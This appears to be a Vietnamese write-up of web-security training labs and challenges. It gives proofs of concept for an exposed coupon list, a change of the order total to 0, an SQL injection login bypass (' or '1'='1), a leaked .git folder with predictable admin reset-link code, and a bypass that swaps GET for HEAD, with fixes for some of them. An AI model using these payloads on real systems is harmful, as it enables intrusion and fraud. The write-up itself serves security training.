- Khi thực hiện xem lương một người dùng thì có một request được gửi lên server và server sẽ trả về toàn bộ danh sách của tất cả người dùng

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image%202.png)

### Cách khắc phục

- Không nên dùng userId để làm tham số kiểm tra, nên sử dụng json web token để mã hóa/giải mã, rồi sử dụng thông tin được giải mã để cung cấp thông tin cho đúng người dùng hợp lệ

## Lab 3

### Nguyên nhân lỗi

- Lập trình viên để lộ một url hiển thị toàn bộ danh sách các coupons

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image%203.png)

### POC

- Truy cập vào đường dẫn `/coupons`  để xem danh sách tất cả các mã giảm giá.

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image%204.png)

- Sử dụng code `get_it_for_free` có discount là 100

### Cách khắc phục

- Thêm quyền cho đường dẫn `/coupons`  chỉ để admin có thể truy cập được hoặc là xóa luôn đường dẫn này.

# **HTML tampering**

### Nguyên nhân lỗi

- Phía server không thực hiện việc lưu trữ và kiểm tra tổng giá trị của một đơn hàng khi Client gửi yêu cầu, mà chỉ sử dụng trực tiếp giá trị được lưu trữ trên phía Client để xử lý. Điều này khiến cho khi mà giá trị ở phía Client bị thay đổi thì phía Server sẽ bị attack.

### POC

- Thực hiện việc gửi request, chặn gói tin này thì có phát hiện một trường dữ liệu là Total đang chứa tổng giá trị đơn hàng. Gửi request này sang Repeater, thay đổi giá trị của Total thành 0 và send request

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image%205.png)

### Cách khắc phục

- Thực hiện gửi mã id, số lượng của sản phẩm lên server. Sau đó, server sẽ kiểm tra tính hợp lệ của id và số lượng sản phẩm → Tính tổng số tiền của đơn hàng đó rồi mới gửi giá trị về cho người dùng tiến hành thanh toán.
[Challenges](Challenges.md)
# Challenges

# **Admin lost password**

## POC

- Tải ảnh ở trang Login về, phân tích ảnh này thì phát hiện tài khoản và mật khẩu của tài khoản admin.

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image.png)

- Đăng nhập với thông tin trên thì nhận được flag

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%201.png)

# **Without password**

- Ở thử thách này, khi chèn payload để thử SQL Injection thì phát hiện ở field password mắc phải SQL Injection.
- Sử dụng Payload sau để đăng nhập thành công

```
username: Larry
password: ' or '1'='1
```

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%202.png)

# **Admin password reset**

- Khi recon thì phát hiện ở trang web này có một đường dẫn là `/.git`
- Truy cập đường dẫn này và tải về một folder git
- Phân tích git thì xem được source code của thử thách này
- Dưới đây là đoạn code được dùng để tạo mã reset

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%203.png)

```java
public class PasswordResetLink {

  public String createPasswordReset(String username, String key) {
    Random random = new Random();
    if (username.equalsIgnoreCase("admin")) {
      // Admin has a fix reset link
      random.setSeed(key.length());
    }
    return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));
  }

  public static String scramble(Random random, String inputString) {
    char[] a = inputString.toCharArray();
    for (int i = 0; i < a.length; i++) {
      int j = random.nextInt(a.length);
      char temp = a[i];
      a[i] = a[j];
      a[j] = temp;
    }
    return new String(a);
  }

  public static void main(String[] args) {
    if (args == null || args.length != 2) {
      System.out.println("Need a username and key");
      System.exit(1);
    }
    String username = args[0];
    String key = args[1];
    System.out.println("Generation password reset link for " + username);
    System.out.println(
        "Created password reset link: "
            + new PasswordResetLink().createPasswordReset(username, key));
  }
}
```

- Chạy lại đoạn code trên với username là `admin`

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%204.png)

Mã hash của admin là:`375afe1104f4a487a73823c50a9292a2` . Truy cập bằng mã hash này thì nhận được flag

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%205.png)

# **Without account**

- Nguyên nhân gây lỗi là server chỉ kiểm tra nếu không phải phương thức GET  trong khi dùng 
`GetMapping`  → Chỉ cần đổi sang phương thức `HEAD`

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%206.png)

- Đổi method GET thành HEAD để lấy được flag

![image.png](Challenges%20b61a6920f75a4e39927690162658cb26/image%207.png)